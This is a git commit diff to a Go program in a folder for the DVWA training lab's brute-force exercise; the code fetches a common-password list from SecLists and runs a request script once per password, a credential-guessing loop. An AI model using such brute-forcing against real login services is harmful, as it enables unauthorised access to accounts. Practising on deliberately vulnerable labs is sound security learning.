d89e4c830db4c97d31e6ee80cfa7e5c5aabc4f19
Thomas M <tjm165@case.edu>
2025-03-03 19:43:01 -0600

    brute force easy

--- dvwa/1_brute_force/easy/main.go
+++ dvwa/1_brute_force/easy/main.go
@@ -8,38 +8,32 @@ import (
 	"net/http"
 )
 
-func main() {
-	listUrl := "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best15.txt"
-	
+func pullTxtData(url string) (*bufio.Scanner, error) {
 	// Make HTTP GET request
-	resp, err := http.Get(listUrl)
+	resp, err := http.Get(url)
 	if err != nil {
-		fmt.Println("Error fetching file:", err)
-		return
+		return nil, fmt.Errorf("error fetching file: %v", err)
 	}
-	defer resp.Body.Close()
 
 	// Check if HTTP status is OK
 	if resp.StatusCode != http.StatusOK {
-		fmt.Println("Error: HTTP status", resp.Status)
-		return
+		return nil, fmt.Errorf("error: HTTP status %s", resp.Status)
 	}
 
+	return bufio.NewScanner(resp.Body), nil
+}
+
+func main() {
+	scriptPath := "./request.sh" // Ensure the script has execute permission (chmod +x *.sh)
+	listUrl := "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best15.txt"
+	
+	scanner, _ := pullTxtData(listUrl)
+
 	// Read file line by line
-	scanner := bufio.NewScanner(resp.Body)
 	for scanner.Scan() {
 		line := scanner.Text()
-
-		// Define the shell script path
-		scriptPath := "./request.sh" // Ensure the script has execute permission (chmod +x *.sh)
-
-		// Define the argument
-		arg := line
-
-		fmt.Println("Trying exec.Command:", scriptPath, arg) // Process each line
-
-		// Execute the script with the argument
-		cmd := exec.Command(scriptPath, arg)
+		fmt.Println("Trying exec.Command:", scriptPath, line) // Process each line
+		cmd := exec.Command(scriptPath, line)
 
 		// Capture the output
 		output, err := cmd.CombinedOutput()
